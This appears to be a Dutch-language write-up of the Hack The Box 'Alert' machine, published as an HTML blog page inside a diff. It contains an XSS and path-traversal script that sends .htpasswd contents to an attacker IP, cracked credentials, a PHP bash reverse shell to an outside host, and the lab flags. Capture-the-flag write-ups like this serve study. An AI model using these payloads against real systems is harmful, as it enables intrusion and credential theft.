@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Als eerst gaan we gaan scannen welke services er allemaal opstaan. Dit zullen we gaan doen aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.40.130 -vvvv We kunnen zien dat er maar 2 services up zijn. De volgende services en porten staan er open.
+Port 22: SSH Port 80: Http Hier bij poort 80 zien we dat de niet gedirect wordt naar de website. Wat dus betekent dat we deze zullen moeten toevoegen aan de hosts file. Dit zullen we gaan doen aan de hand van het volgende commando:
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-alert/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Als eerst gaan we gaan scannen welke services er allemaal opstaan. Dit zullen we gaan doen aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.40.130 -vvvv We kunnen zien dat er maar 2 services up zijn. De volgende services en porten staan er open.
+Port 22: SSH Port 80: Http Hier bij poort 80 zien we dat de niet gedirect wordt naar de website. Wat dus betekent dat we deze zullen moeten toevoegen aan de hosts file. Dit zullen we gaan doen aan de hand van het volgende commando:">
+  <meta itemprop="wordCount" content="691">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Als eerst gaan we gaan scannen welke services er allemaal opstaan. Dit zullen we gaan doen aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.40.130 -vvvv We kunnen zien dat er maar 2 services up zijn. De volgende services en porten staan er open.
+Port 22: SSH Port 80: Http Hier bij poort 80 zien we dat de niet gedirect wordt naar de website. Wat dus betekent dat we deze zullen moeten toevoegen aan de hosts file. Dit zullen we gaan doen aan de hand van het volgende commando:">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-alert/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>Als eerst gaan we gaan scannen welke services er allemaal opstaan. Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>nmap -p- -sCV 10.129.40.130 -vvvv
+</code></pre><p>We kunnen zien dat er maar 2 services up zijn. De volgende services en porten staan er open.</p>
+<pre tabindex="0"><code>Port 22: SSH
+
+Port 80: Http
+</code></pre><p><img src="75956227.png" alt="image-20250102-165829.png"></p>
+<p>Hier bij poort 80 zien we dat de niet gedirect wordt naar de website. Wat dus betekent dat we deze zullen moeten toevoegen aan de hosts file. Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>sudo nano /etc/hosts
+</code></pre><p><img src="75300876.png" alt="image-20250102-170251.png"></p>
+<p>Nu kan je zien dat we wel naar de website kunnen gaan.</p>
+<p><img src="76021775.png" alt="image-20250102-170329.png"></p>
+<p>we gaan het de directories gaan kijken of dat er geen interessante dingen te vinden zijn zoals een subdomain, files, …</p>
+<p>Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>ffuf -u http://alert.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &#34;Host:FUZZ.alert.htb&#34; -ac
+</code></pre><p><img src="75923468.png" alt="image-20250102-174755.png"></p>
+<p>Ik heb de volgende subdomain gevonden.</p>
+<p>Ik ben gaan zoeken naar een exploit voor Markdown viewer. Hierbij heb ik het volgende script gezocht waarmee we een merkdown file gaan maken en deze zullen gaan uploaden op de website.</p>
+<p>Script staat hieroder in code.</p>
+<pre tabindex="0"><code>&lt;script&gt;
+fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;)
+  .then(response =&gt; response.text())
+  .then(data =&gt; {
+    fetch(&#34;http://10.10.16.11:8888/?file_content=&#34; + encodeURIComponent(data));
+  });
+&lt;/script&gt;
+</code></pre><p>1 keer dat we de file hebben upgeload, zien we onderin de ShareMarkdown staan.</p>
+<p><img src="75956241.png" alt="image-20250102-175636.png"></p>
+<p>Als we over deze link gaan zien de volgende url boven komen.</p>
+<p>![[Pasted image 20250122144541.png]]</p>
+<p>Deze url ben ik is gaan testen door deze in te geven in de contact us. nu zien we op onze andere prompt waarop dat we een connectie hebben gestart voor de gegevens binnen te kunnen krijgen dat er een hash op ons beeld scherm komt. Dit betekend dus dat we connectie hebben kunnen maken met de server.</p>
+<p><img src="75923479.png" alt="image-20250102-175924.png"></p>
+<p>Hiervan heb ik nu een hash file gemaakt zodat we deze hash kunnen gaan beginnen cracken. Voor dat ik de hash file heb gemaakt heb ik aan chatgpt gevraagd voor dit naar een code om te zetten waarmee ik kan gaan hacken.</p>
+<p><img src="75300896.png" alt="image-20250102-181007.png"></p>
+<p><img src="75300902.png" alt="image-20250102-181249.png"></p>
+<p>Dit zal ik gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash --&gt; hash is de naam van mijn file waarin de hash is.
+</code></pre><p>de hash is gecracked en we kunnen nu het password en de username gaan gebruiken voor in te kunnen loggen op de ssh server.</p>
+<pre tabindex="0"><code>username: albert
+
+password: manchesterunited
+</code></pre><p><img src="75923492.png" alt="image-20250102-181200.png"></p>
+<p>zoals je kan zien zijn we nu ingelogd als de user albert.</p>
+<p><img src="75956254.png" alt="image-20250102-181348.png"></p>
+<p>en hebben we dus hiermee nu ook de user flag gevonden.</p>
+<p>user flag: 10a0f42e172f08d1dbb18b9ac1688980</p>
+<p><img src="75923498.png" alt="image-20250102-181423.png"></p>
+<p>Dit wilt dus zeggen dat we nu ook op de subdomain statistics kunnen gaan inloggen met dezelfde user credentials.</p>
+<p><img src="76021796.png" alt="image-20250102-181719.png"></p>
+<p>Ik ben gaan kijken in de /etc/hosts file en daar heb ik gezien dat er een webservices op 127.0.0.1 draait. We zullen aan de hand volgende commando deze gaan up zetten zodat we ermee kunnen connecteren.</p>
+<pre tabindex="0"><code>ssh albert@alert.htb -L 8080:127.0.0.1:8080 
+</code></pre><p>Als we dus nu gaan zoeken op het ip address 127.0.0.1:8080, dan gaan we het volgende te zien krijgen.</p>
+<p><img src="76021805.png" alt="image-20250102-183022.png"></p>
+<p>als we nu is gaan kijken in de ssh connectie naar de monitors website. Als we daar het volgende commando gaan uitvoeren dan zullen we zien dat we via daar root kunnen worden.</p>
+<p><img src="75956264.png" alt="image-20250102-183531.png"></p>
+<p>Met het commando “ls -ld“ gaan we laten zien welke rechten de directory heeft waarin we op dat moment zitten.</p>
+<p>we gaan in de config directory de code gaan toevoegen waarmee we contact zullen gaan maken voor root user te bekomen.</p>
+<p><img src="75923515.png" alt="image-20250102-192023.png"></p>
+<p>We gaan in dit path een .php file aanmaken en we zetten daar het volgende in.</p>
+<pre tabindex="0"><code>&lt;?php exec(&#34;/bin/bash -c &#39;bash -i &gt;/dev/tcp/10.10.14.135/100 0&gt;&amp;1&#39;&#34;); ?&gt;
+</code></pre><p>we gaan dit opslaan en open we een tweede terminal waarin we nc connectie opzetten. Dit zullen we gaan doen aan de hand van de volgende code:</p>
+<pre tabindex="0"><code>sudo nc -lvnp 100
+</code></pre><p>Als we nu naar het internet gaan en we zoeken de url op waar we zonet onze .php file hebben aangemaakt zullen we een connectie krijgen als root user.</p>
+<p><img src="75956276.png" alt="image-20250102-192312.png"></p>
+<p>zoals je kan zien op je scherm hebben we een root connectie.</p>
+<p><img src="75300918.png" alt="image-20250102-192424.png"></p>
+<p>Als we nu naar de root directory gaan zullen we daar de root flag zien staan en hebben we hierbij dus ook de root flag bemachtigd.</p>
+<p><img src="75923526.png" alt="image-20250102-192534.png"></p>
+<p>Root Flag: 5a471196b1d20898edb394319d626c3e</p>
+<p><img src="75956284.png" alt="image-20250102-192819.png"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
